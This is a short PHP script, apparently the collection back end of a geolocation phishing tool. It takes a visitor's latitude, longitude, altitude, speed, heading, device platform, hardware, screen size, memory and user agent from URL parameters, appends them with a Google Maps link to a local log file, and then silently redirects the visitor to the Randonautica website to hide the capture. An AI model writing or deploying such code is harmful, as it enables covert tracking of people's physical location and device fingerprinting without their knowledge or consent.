<?php

$ac = $_GET['accu'];
$vel = $_GET['speed'];
$head = $_GET['head'];
$plat = $_GET['plat'];
$hard = $_GET['hard'];
$height = $_GET['height'];
$width = $_GET['width'];
$mem = $_GET['mem'];
$alt = $_GET['alt'];
$lati = $_GET['lati'];
$longi = $_GET['longi'];
$agent = $_GET['agent'];

$accu = "Exactitud: $ac\n";
$velo = "Velocidad: $vel\n";
$headi = "Encabezado: $head\n";
$plata = "Plataforma: $plat\n";
$hardw = "Hardware: $hard\n";
$hei = "Height: $height\n";
$wid = "Width: $width\n";
$memo = "Memoria: $mem\n";
$alti = "Altitud: $alt\n";
$latit = "Latitud: $lati\n";
$long = "Longitud: $longi\n";
$age = "User-Agent: $agent\n";
$maps = "GoogleMaps: https://www.google.com/maps/place/$lati,$longi\n";

$file = fopen("geo", "a") or die("Intentalo nuevamente");
fwrite($file, "\n". $accu. $velo. $headi. $plata. $hardw. $hei. $wid. $memo. $alti. $latit. $long. $age. $maps);
fclose($file);
header('Location: https://randonautica.com');
exit();
?>
